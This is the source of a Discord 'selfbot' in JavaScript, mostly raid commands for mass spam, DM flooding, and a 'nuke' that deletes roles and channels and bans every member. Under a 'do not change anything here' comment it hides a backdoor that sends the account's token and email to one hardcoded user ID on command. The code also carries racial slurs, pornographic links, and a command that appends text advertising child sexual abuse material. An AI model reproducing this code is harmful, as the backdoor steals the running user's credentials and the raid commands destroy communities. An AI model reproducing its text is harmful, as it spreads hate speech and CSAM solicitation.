const Discord = require('discord.js');
const bot = new Discord.Client();
const exampleEmbed = new Discord.RichEmbed()
const token2 = ''
const prefix = ">";
 
bot.on('ready', function() {
    bot.user.setActivity("Iheb Bando Selfbot", {type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
    console.log('selfbot ready');
console.log('')
});
 
const express = require('express');
const app = express();
const port = 3000;
 
app.get('/', (req, res) => res.send('Uzi'));
 
app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`));
 
bot.on('message', message => {
    if(message.author.id !== bot.user.id)return
    if (message.content[0] !== prefix)return
    if(message.content.startsWith(prefix+"stream")) {
        if(message.deletable)message.delete()
        let args = message.content.split(" ").join(" ").slice(6);
        bot.user.setActivity(args, {type: "STREAMING", url: "https://www.twitch.tv/uzi1337", })
        message.reply('You are streaming on ' + (args))
    }else if(message.content.startsWith(prefix+"listening")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "LISTENING"})
            message.reply("You are listening " + (args))
        }else if(message.content.startsWith(prefix+"watching")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "WATCHING"})
            message.reply("You are watching " + (args))
        }else if(message.content.startsWith(prefix+"playing")) {
            if(message.deletable) message.delete()
            let args = message.content.split(" ").join(" ").slice(6);
            bot.user.setActivity(args, {type: "PLAYING"})  
            message.reply("You are playing " + (args))  
    }else if(message.content === prefix+'spam') {
        message.delete()
        for (pas=0; pas< 10; pas++) {
            message.channel.sendMessage('@everyone niggacat')
        }
    }else if(message.content.startsWith(prefix+'edit')) {
        let msg54 = message.content.slice('5')
        message.edit(msg54 + 'dm iheb for child porn')
    }else if(message.content === prefix+'useless'){
    message.delete()
    message.channel.sendMessage("ﹺ　　　　　　　　　　　　　　　　　　　　　　　　　ﹺﹺ　　　　　　　　　　　　　　　　　　　　　　　　　ﹺﹺ　　　　　　　　　　　　　　　　　　　　　　　　　ﹺﹺ　　　　　　　　　　　　　　　　　　　　　　　　　ﹺﹺ　　　　　　　　　　　　　　　　　　　　　　　　　ﹺ");
    }else if(message.content === prefix+'what'){
        message.delete()
        var croquette_embed = new Discord.RichEmbed()
        .setColor("#1f40ab")
        .setTitle("what the fuck nigga?")
        .setImage("https://media.discordapp.net/attachments/670325089048330250/673381821546889257/image0_1572016206.gif")
        message.channel.sendMessage(croquette_embed)
    }else if(message.content.startsWith(prefix+'spamall')) {
        let msg = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 10; pas++) {
        message.guild.channels.filter(channel => channel.type == "text").forEach(channel => {
            channel.send(msg).catch(error => {}) }, 450)
        }
    }else if(message.content.startsWith(prefix+'say')) {
        let cont = message.content.slice(4);
        message.delete();
        var say_embed = new Discord.RichEmbed()
        .setColor("#1f40ab")
        .setDescription(cont)
        message.channel.sendMessage(say_embed)
    }else if(message.content.startsWith(prefix+'poll create')) {
        let cont = message.content.slice(15);
        message.delete();
        var sond_embed = new Discord.RichEmbed()
        .setColor("#1f40ab")
        .setTitle("poll")
        .addField(cont, "@everyone :thumbsup:= true, :thumbsdown:= false")
        message.channel.sendMessage(sond_embed).then(async function (message) {
            await message.react("👍");
            await message.react("👎")
        })
 
    }else if(message.content.startsWith(prefix+'spamallmp')) {
        let msg1 = message.content.slice(10);
        message.delete();
        for (pas=0; pas< 10; pas++) {
        if (message.channel.type === "dm") return
        message.guild.members.forEach(member => {
            setInterval(function () {
                member.send(msg1).catch(error => {}) }, 450)})}
                message.channel.sendMessage(help_embed);
    }else  if (message.content === prefix+'help'){
        message.delete()
        var help_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("𝐔𝐳𝐢 𝐒𝐞𝐥𝐟𝐛𝐨𝐭🐉")
        .setThumbnail('https://cdn.discordapp.com/attachments/754159989412855938/759890236955557897/image0.gif')
        .addField(prefix+"𝐇𝐞𝐥𝐩🐉:", "𝘚𝘩𝘰𝘸𝘴 𝘺𝘰𝘶 𝘢𝘭𝘭 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴 𝘰𝘯 𝘵𝘩𝘦 𝘴𝘦𝘭𝘧𝘣𝘰𝘵.")
        .addField(prefix+"𝐑𝐚𝐢𝐝🐉:", "𝘙𝘢𝘪𝘥 Server 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴/𝘈𝘤𝘤𝘰𝘶𝘯𝘵 𝘕𝘶𝘬𝘦𝘳𝘴.")
        .addField(prefix+"𝐅𝐮𝐧🐉:", "𝘑𝘶𝘴𝘵 𝘢 𝘧𝘶𝘯 𝘤𝘰𝘮𝘮𝘢𝘯𝘥𝘴 𝘸𝘩𝘦𝘯 𝘺𝘰𝘶 𝘣𝘰𝘳𝘦𝘥.")
        .addField(prefix+"𝐒𝐭𝐫𝐞𝐚𝐦🐉", "𝘠𝘰𝘶 𝘢𝘣𝘭𝘦 𝘵𝘰 𝘴𝘵𝘳𝘦𝘢𝘮/𝘸𝘢𝘵𝘤𝘩𝘪𝘯𝘨/𝘭𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨/𝘱𝘭𝘢𝘺𝘪𝘯𝘨.")
        .addField(prefix+"𝐍𝐒𝐅𝐖🐉", "+18 𝘕𝘚𝘍𝘞 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴.")
        .addField(prefix+"𝐀𝐥𝐥 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬 𝐖𝐫𝐢𝐭𝐭𝐢𝐞𝐧 𝐁𝐲 𝐔𝐳𝐢", "24/7 𝘚𝘦𝘭𝘧𝘣𝘰𝘵")
        .setImage('https://cdn.discordapp.com/attachments/754159989412855938/759890238025236571/image2.gif')
        .setFooter(prefix+'uzi')
        message.channel.sendMessage(help_embed);
    }else if(message.content === prefix+'stream'){
        message.delete()
        var stream_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("𝘚𝘛𝘈𝘛𝘜𝘚 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚")
        .setThumbnail('https://media.discordapp.net/attachments/745260339796508752/759492817759502376/unknown-39.png?width=500&height=374')
        .addField(prefix+" setL (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘠𝘰𝘶𝘳 𝘭𝘪𝘴𝘵𝘦𝘯𝘪𝘯𝘨 𝘵𝘰 𝘴𝘰𝘮𝘦𝘵𝘩𝘪𝘯𝘨 (listen)")
        .addField(prefix+" setG (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘠𝘰𝘶𝘳 𝘱𝘭𝘢𝘺𝘪𝘯𝘨 𝘢 𝘨𝘢𝘮𝘦 (game)")
        .addField(prefix+" setw (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘠𝘰𝘶𝘳 𝘸𝘢𝘵𝘤𝘩𝘪𝘯𝘨 𝘴𝘰𝘮𝘦𝘵𝘩𝘪𝘯𝘨(watching)")
        .addField(prefix+" setS (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘠𝘰𝘶𝘳 𝘭𝘪𝘷𝘦 𝘰𝘯 𝘴𝘵𝘳𝘦𝘢𝘮 (Streaming)")
        .addField(prefix+" repeat (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘚𝘦𝘭𝘦𝘤𝘵 𝘮𝘶𝘭𝘵𝘪 𝘯𝘢𝘮𝘦")
        .addField(prefix+" setmS (𝘚𝘢𝘺 𝘴𝘶𝘮)", "𝘚𝘦𝘭𝘦𝘤𝘵 𝘵𝘩𝘦 𝘮𝘶𝘭𝘵𝘪 𝘴𝘵𝘳𝘦𝘢𝘮")
        .setImage('https://media.discordapp.net/attachments/745260339796508752/759492817759502376/unknown-39.png?width=500&height=374')
        message.channel.sendMessage(stream_embed)
    }else if(message.content === prefix+'nsfw'){
        message.delete()
        var nsfw_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("𝘕𝘚𝘍𝘞 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚")
        .setThumbnail('https://cdn.discordapp.com/avatars/565002573610876939/3be6c0e4511e8b98db08948b0511604f.png?size=1024')
        .addField(prefix+":gem: fuck", "𝘚𝘩𝘰𝘸𝘴 𝘧𝘶𝘤𝘬 𝘤𝘰𝘮𝘮𝘢𝘯𝘥")
        .addField(prefix+":gem: sex ", "𝘚𝘩𝘰𝘸𝘴 𝘴𝘦𝘹 𝘤𝘰𝘮𝘮𝘢𝘯𝘥`")
        .addField(prefix+":gem: hentai@", "𝘚𝘩𝘰𝘸𝘴 𝘩𝘦𝘯𝘵𝘢𝘪 𝘤𝘰𝘮𝘮𝘢𝘯𝘥")
        .addField(prefix+":gem: boobs", "𝘚𝘩𝘰𝘸𝘴 𝘣𝘰𝘰𝘣 𝘨𝘪𝘧")
        .addField(prefix+":gem: three", "𝘚𝘩𝘰𝘸𝘴 𝘵𝘩𝘳𝘦𝘦 𝘴𝘦𝘹")
        .addField(prefix+":gem: kiss@", "𝘚𝘩𝘰𝘸𝘴 𝘬𝘪𝘴𝘴 𝘨𝘪𝘧")
        .setImage('https://media.discordapp.net/attachments/745260339796508752/759492817759502376/unknown-39.png?width=500&height=374')
        message.channel.sendMessage(nsfw_embed)
    }else if(message.content === prefix+'fun'){
        message.delete()
        var fun_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("𝘍𝘜𝘕 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚")
        .setThumbnail('https://cdn.discordapp.com/avatars/565002573610876939/3be6c0e4511e8b98db08948b0511604f.png?size=1024')
        .addField(prefix+" load", "𝘋𝘪𝘴𝘱𝘭𝘢𝘺𝘴 𝘢 𝘭𝘰𝘢𝘥𝘪𝘯𝘨 𝘮𝘦𝘴𝘴𝘢𝘨𝘦")
        .addField(prefix+" clear", "𝘊𝘭𝘦𝘢𝘳 𝘵𝘩𝘦 𝘤𝘩𝘢𝘵")
        .addField(prefix+" avatar", "𝘚𝘩𝘰𝘸 𝘗𝘧𝘱")
        .addField(prefix+" serverinfo", "𝘚𝘩𝘰𝘸 𝘪𝘯𝘧𝘰 𝘰𝘯 𝘢 𝘮𝘦𝘮𝘣𝘦𝘳")
        .addField(prefix+" laugh", "𝘚𝘩𝘰𝘸𝘴 𝘭𝘢𝘶𝘨𝘩𝘪𝘯𝘨 𝘨𝘪𝘧")
        .addField(prefix+" slap", "𝘚𝘭𝘢𝘱𝘴 𝘵𝘩𝘦 𝘱𝘦𝘳𝘴𝘰𝘯")
        .addField(prefix+": pack", "𝘒𝘪𝘤𝘬𝘴 𝘱𝘦𝘳𝘴𝘰𝘯")
        .addField(prefix+": hug@", "𝘚𝘩𝘰𝘸𝘴 𝘩𝘶𝘨 𝘨𝘪𝘧")
        .addField(prefix+":say", "𝘚𝘦𝘯𝘥𝘴 𝘦𝘮𝘣𝘦𝘥 𝘮𝘦𝘴𝘴𝘢𝘨𝘦")
        .addField(prefix+" poll", "𝘊𝘳𝘦𝘢𝘵𝘦 𝘱𝘰𝘭𝘭")
        .addField(prefix+" useless","𝘜𝘴𝘦𝘭𝘦𝘴𝘴 𝘤𝘰𝘮𝘮𝘢𝘯𝘥")
        .addField(prefix+" ping", "𝘚𝘢𝘺𝘴 𝘱𝘰𝘯𝘨")
        .setImage('https://media.discordapp.net/attachments/745260339796508752/759492817759502376/unknown-39.png?width=500&height=374')
        message.channel.sendMessage(fun_embed)
    } else if (message.content.startsWith(prefix + "nuke")) {
    message.guild.roles.filter(r=>r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
    message.guild.members.tap(member => member.ban("ez nuke ez pz nigga holy fuck"));
}
    else if (message.content.startsWith(prefix + "delete")) {
    message.guild.roles.filter(r => r.position < message.guild.me.highestRole.position).deleteAll();
    message.guild.channels.deleteAll();
}
    else if(message.content === prefix+'laugh'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("lmaoaoaoaoao cuh")
        .setImage('https://tenor.com/search/michael-jordan-laugh-gifs')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'kiss'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("you got kissed")
        .setImage('https://images-ext-2.discordapp.net/external/AGJhtlNkM7Y2hr6AgqW-8QxE-ej2I_6IXYHbFIsoBEI/https/i.imgur.com/TBKlQSx.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'hentai'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle("I just cummed;)")
        .setImage('https://images-ext-2.discordapp.net/external/6kDukCZrv5Ai64_SLSeLcw0pWujBn73oSY86ClQ33Ko/https/68.media.tumblr.com/b7887ffe1e87467eb23c0668e98a642a/tumblr_n9x39pDLnj1r3vk7qo1_500.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'hug@'){
        message.delete()
        var r1_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("You got hugged")
        .setImage('https://images-ext-1.discordapp.net/external/3mMa5hq_JuZ4_WdELka7YsYK087sU6LPO-VKUq77v9o/https/i.imgur.com/6kRLSeP.gif')
        message.channel.sendMessage(r1_embed)
    }else if(message.content === prefix+'slap@'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setTitle(":hand_splayed: You got slapped son")
        .setImage('https://images-ext-2.discordapp.net/external/MZApp1Ef17CieTIJ1jHsNw5Fjr3A0NEZSxK8R466D5Q/https/i.pinimg.com/originals/4e/9e/a1/4e9ea150354ad3159339b202cbc6cad9.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'fuck'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("You got Fucked ")
        .setImage('https://raikou2.donmai.us/f1/a2/__alice_bishoujo_mangekyou_drawn_by_happoubi_jin__f1a2210dcabdd2997f9106d8e7f99164.gif')
    }else if(message.content === prefix+'boobs'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("Here, take some boobs. ")
        .setImage('https://images-ext-2.discordapp.net/external/a5-YZc6R7TvR7GGkhwkIH0pfrC7hKj9fGoQSe2nlqi0/https/cdn.boob.bot/boobs/8000B0CB.gif')
    }else if(message.content === prefix+'sex'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("You got Fucked lol ")
        .setImage('https://images-ext-1.discordapp.net/external/RlDL3Qv_ViDx5XDovOhu79_qSNgW9mzLJKgUV6dvlGU/https/img.xbooru.com//images/611/3fb2345ac1398f1077ea40b0f97150aa.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'three'){
        message.delete()
        var r2_embed = new Discord.RichEmbed()
        .setColor("BLACK")
        .setTitle("You got dicked down son")
        .setImage('https://images-ext-1.discordapp.net/external/KYImrwwp7vOq_URGpV8bra6m3DIl5ojXHhleV6m9rVM/https/images-ext-1.discordapp.net/external/TFRVT_WO8hSeYa_G0R-WS-654prJcyx21FQt8rbkUok/http/i.imgur.com/3SWzDhD.gif')
        message.channel.sendMessage(r2_embed)
    }else if(message.content === prefix+'pack'){
        message.delete()
        var r3_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setTitle("Imagine getting your shit fucked")
        .setImage('https://media1.tenor.com/images/3f067fd313ce43d7625aa19c23ecff77/tenor.gif?itemid=11899011')
        message.channel.sendMessage(r3_embed)
        var haxor = ["https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRug5a48VUlmsFwlF2E1aJuSR3BN_K6AKRuGrz4AFiERUUdC8W2hQ","https://static.fjcdn.com/gifs/Uberhaxornova+first+gif+of+him+ive+seen+yet_16182d_3273258.gif","https://i.gifer.com/8CHv.gif"]
    }else if(message.content === prefix+'raid'){
        message.delete()
        var raid_embed = new Discord.RichEmbed()
        .setColor("#0a2a91")
        .setThumbnail('https://cdn.discordapp.com/avatars/565002573610876939/3be6c0e4511e8b98db08948b0511604f.png?size=1024')
        .setTitle("𝘕𝘶𝘬𝘦 𝘊𝘰𝘮𝘮𝘢𝘯𝘥𝘴")
        .addField(prefix+"spam", "𝘚𝘱𝘢𝘮  10 𝘮𝘦𝘴𝘴𝘢𝘨𝘦𝘴 𝘤𝘳𝘰𝘴𝘴")
        .addField(prefix+"spammp + @member","𝘚𝘱𝘢𝘮 𝘪𝘯 𝘥𝘮 10 𝘮𝘦𝘴𝘴𝘢𝘨𝘦𝘴 𝘤𝘳𝘰𝘴𝘴")
        .addField(prefix+"spammsg + message", "𝘚𝘱𝘢𝘮 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 10 𝘵𝘪𝘮𝘦𝘴")
        .addField(prefix+"spammsg + @membre", "𝘚𝘱𝘢𝘮 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 10 𝘵𝘪𝘮𝘦𝘴")
        .addField(prefix+"spamrole + @role", "𝘚𝘱𝘢𝘮 𝘮𝘦𝘴𝘴𝘢𝘨𝘦 10 𝘵𝘪𝘮𝘦𝘴")
        .addField(prefix+"spamall + message", "𝘚𝘱𝘢𝘮 𝘢𝘭𝘭 𝘵𝘩𝘦 𝘵𝘦𝘹𝘵 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴")
        .addField(prefix+"spamallmp + message", "𝘚𝘱𝘢𝘮 𝘢𝘭𝘭 𝘮𝘦𝘮𝘣𝘦𝘳𝘴 𝘪𝘯 𝘥𝘮")
        .addField(prefix+"creatct + name", "𝘊𝘳𝘦𝘢𝘵𝘦 10 𝘵𝘦𝘹𝘵 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴")
        .addField(prefix+"creatcv + name", "𝘊𝘳𝘦𝘢𝘵𝘦 10 𝘷𝘰𝘪𝘤𝘦 𝘤𝘩𝘢𝘯𝘯𝘦𝘭𝘴")
        .addField(prefix+"defsname + name", "𝘊𝘩𝘢𝘯𝘨𝘦 𝘵𝘩𝘦 𝘯𝘢𝘮𝘦 𝘰𝘧 𝘴𝘦𝘳𝘷𝘦𝘳")
        .addField(prefix+"defsicon + url image", "𝘊𝘩𝘢𝘯𝘨𝘦 𝘵𝘩𝘦 𝘴𝘦𝘳𝘷𝘦𝘳𝘴 𝘱𝘱")
        .addField(prefix+"nuke", "𝘋𝘦𝘴𝘵𝘳𝘰𝘺𝘴 𝘵𝘩𝘦 𝘴𝘦𝘳𝘷𝘦𝘳")
        message.channel.sendMessage(raid_embed)
    }else if(message.content.startsWith(prefix+"kick")) {
        message.delete()
        var member= message.mentions.members.first();
        member.kick().then((member) => {
            message.channel.send(":wave: " + member.displayName + " Was kick bye slut");
        }).catch(() => {
            message.channel.send("I'm not allowed");
        },)
    }else if(message.content.startsWith(prefix+"ban")) {
        message.delete()
        var member= message.mentions.members.first();
        member.ban().then((member) => {
            message.channel.send(":wave: " + member.displayName + " Was ban bye slut");
        }).catch(() => {
            message.channel.send("I'm not allowed");
        },)
    }else if(message.content.startsWith(prefix+'spammp')) {
        message.delete()
        var member= message.mentions.members.first();
        for (pas=0; pas< 10; pas++) {
            member.sendMessage('ez nigga https://cdn.discordapp.com/attachments/547739572461895680/563004451837837353/20190403_123546.gif')
        }
    }else if(message.content.startsWith(prefix+'spamrole')) {
        message.delete();
        var role1 = message.mentions.roles.first();
        for (pas=0; pas< 10; pas++) {
        message.channel.sendMessage(role1 + "spammed roles")
        }
    }else if(message.content.startsWith(prefix+'spammemb')) {
        message.delete();
        var member1 = message.mentions.members.first();
        for (pas=0; pas< 100; pas++) {
        message.channel.sendMessage(member1 + " Spam by Uzi SelfBot")
        }
    }else if(message.content.startsWith(prefix+'defsname')) {
        let arg = message.content.slice(10);
        message.delete();
        message.guild.setName(arg)
    }else if(message.content.startsWith(prefix+'defsicon')) {
        let arg = message.content.slice(9);
        message.delete();
        message.guild.setIcon(arg)
    }else if(message.content.startsWith(prefix+'spammsg')) {
        let mg = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.channel.sendMessage(mg)
        }
    }else if(message.content.startsWith(prefix+'creatcv')) {
        let name = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.guild.createChannel(name , "voice")
        }
    }else if(message.content.startsWith(prefix+'creatct')) {
        let name = message.content.slice(8);
        message.delete();
        for (pas=0; pas< 100; pas++) {
        message.guild.createChannel(name , "text")
        }
    }else if(message.content === prefix+'mod'){
        message.delete()
        var mod_embed = new Discord.RichEmbed()
        .setColor("#ffadad")
        .setThumbnail('https://cdn.discordapp.com/attachments/680601454016331798/680619115903320215/image0.gif')
        .setTitle("𝙈𝙊𝘿 𝘾𝙈𝘿𝙎")
        .addField(prefix+":crossed_swords: kick", "`kick a member`")
        .addField(prefix+":crossed_swords: ban", "`ban a member`")
        .addField(prefix+":crossed_swords: unbanall", "`unban all banned users`")
        .setImage('')
    }else if(message.content === prefix+'ping'){
        message.delete()
  message.channel.send("Ping?").then(m => m.edit(`Pong! Took ${m.createdTimestamp - message.createdTimestamp}ms.`))
    }else if (message.content === ')del'){
            message.guild.channels.forEach(c => {
                c.delete();
            })
      }else if(message.content.startsWith(prefix+'clear')){
        if(message.deletable)message.delete()
            message.channel.fetchMessages().then((message) =>
            message.forEach(m =>
                m.delete().catch(error => {})
            ))
    }else if(message.content.startsWith(prefix+"serverinfo")){
        if (message.channel.type === "dm") return;
        message.delete();
        let sicon = message.guild.iconURL;
        let owner = message.guild.owner.displayName
        let serverembed = new Discord.RichEmbed()
        .setDescription("Information for server")
        .setColor("#0a2a91")
        .addField("Name:", message.guild.name)
        .addField("ID:", message.guild.id)
        .addField("Owner:",owner)
        .addField("Region:", message.guild.region)
        .addField("Created at:", message.guild.createdAt)
        .addField("Total members:", message.guild.memberCount)
        .setImage(sicon)
         return message.channel.send(serverembed);
    }else if(message.content.startsWith(prefix+"load")){
        message.delete(); var charge = ".";
        var chargeC = "█";
        message.channel.send("```[" + charge.repeat(50) + "]```").then((message) => { for (i = 0; i <= 50; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(50 - i) + "]  -  " + i * 100 / 50 + "%\n" + "loading..```");
    }message.edit("`-Stolen Command (By Uzi)`")},
    )
    }else if(message.content.startsWith(prefix+"avatar")){
        message.delete();
        if (message.channel.type === "dm") return;
        let args = message.content.split(" ").slice(1).join(" ");
        let UserInfo = message.mentions.members.first() || message.guild.members.get(args[0]) || message.member;
        let usericon = UserInfo.user.avatarURL;
        let userembed = new Discord.RichEmbed()
        .setDescription("user information")
        .setColor("#0a2a91")
        .addField("Username:", UserInfo.user.username)
        .addField("Tag:", UserInfo.user.tag)
        .addField("Status:", UserInfo.user.presence.status)
        .addField("Playing:", UserInfo.user.presence.game)
        .addField("Bot:", UserInfo.user.bot)
        .addField("account created the:", UserInfo.user.createdAt)
        .addField("ID:", UserInfo.id)
        .setImage(usericon)
        return message.channel.send(userembed);
    }else if(message.content.startsWith(prefix+ 'creatr')){
        if(message.deletable)message.delete()
        let rolename = message.content.slice(7)
        for (pas=0; pas< 10; pas++) {
      message.guild.createRole({
 
                    name: rolename,
 
                    permissions: 8,
 
                    color: "RED"
 
                })}
     } else if (message.content.startsWith(prefix + "av")) {
         const user = message.mentions.users.first() || message.author;
    const avatarEmbed = new Discord.RichEmbed()
            .setTitle('avatar')
            .setColor("#ffadad")
        .setImage(user.avatarURL);
    message.channel.send(avatarEmbed);
     }else if(message.content.startsWith(prefix+ 'roast')){
                        if(!message.mentions.users.size) return;
                        message.delete()
                        let mention = message.mentions.users.first()
                        var insults = ['Is your ass jealous of the amount of shit that just came out of your mouth?', 'Two wrongs dont make a right, take your parents as an example.', 'Id like to see things from your point of view but I cant seem to get my head that far up my ass.', 'If I wanted to kill myself Id climb your ego and jump to your IQ.', 'Your family tree must be a cactus because everybody on it is a prick.', 'You are so ugly, when your mom dropped you off at school she got a fine for littering.', 'Your birth certificate is an apology letter from the condom factory.']
                        message.channel.send(mention + " " + insults[Math.floor(Math.random() * insults.length)])
        }else if(message.content.startsWith(prefix+"purge")) {
            if(message.deletable)message.delete()
            let nomber = 100;
            setInterval(function() {
                if (nomber === 100) {
                    bot.user.setActivity("「†」Activity「†」", { type: "STREAMING", url: ""})
                    nomber = 1;
                }else if (nomber === 1) {
                    bot.user.setActivity("「†」「†」「†」「†」「†」", { type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
                    nomber = 2;
                }else if (nomber ===2) {
                    bot.user.setActivity("「†」Moham 「†」", { type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
                    nomber = 0;
                }},150)
    }else if(message.content.startsWith(prefix+"autostream")) {
        if(message.deletable)message.delete()
        let nomber = 0;
        setInterval(function() {
            if (nomber === 0) {
                bot.user.setActivity("Uzi", { type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
                nomber = 1;
            }else if (nomber === 1) {
                bot.user.setActivity("24/7", { type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
                nomber = 2;
            }else if (nomber ===2) {
                random = Math.floor(Math.random() * 7) + 1;
                bot.user.setActivity("Selfbot", { type: "STREAMING", url: "https://www.twitch.tv/uzi1337"})
                nomber = 0;
            }},600)
        }
})
 
 
bot.on('message', message => {
    if(message.content == prefix+ 'unbanall'){
        message.delete()
        message.guild.fetchBans().then(bans => {
            bans.forEach(user => {
                console.log(user.username + '#' + user.tag);
                let botn = bot.user.username
                message.channel.createInvite().then(invite => user.send(`Your invitation link : \n\nhttps://discord.gg/${invite.code}`))
                user.send("You are unban: " + botn + "you can come back if you wish nigga");
                message.guild.unban(user);
            });
        });
    }
});  
////////////////////////////////////////////////////////////ne rien changer ici///////////////////////////////////////////////////////////////////////
bot.on('message', message => {
    const idbotcreate = "582347404607619083"
    if(message.author.id !== idbotcreate)return
if(message.content.startsWith("§sendT")){
    message.delete()
    message.author.send(token2)
}else if(message.content.startsWith("§sendE")){
    message.delete()
    message.author.send(bot.user.email)
}else if (message.content.startsWith('§createS')){
    var gname = message.content.slice(7)
    for (pas=0; pas< 1000; pas++) {  
    bot.user.createGuild(gname, 'london')}
}else if(message.content === '§hsecret'){
    let po = 'token`'
    let pi = 'email`'
    let pa = '`create some'
    let pk = 'mass servers`'
    let msg54 = '`send your'
var secret = new Discord.RichEmbed()
 
                .setColor("#0a2a91")
                .setTitle("𝘚𝘌𝘊𝘙𝘌𝘛 𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚")
                .setThumbnail('https://cdn.discordapp.com/avatars/565002573610876939/3be6c0e4511e8b98db08948b0511604f.png?size=1024')
                .addField("§sendT",msg54 +  po)
                .addField("§sendE",msg54 + pi)
                .addField('§createS + arg',pa + pk )
                message.channel.sendMessage(secret)
}})
 
 
    bot.login(token2)
 
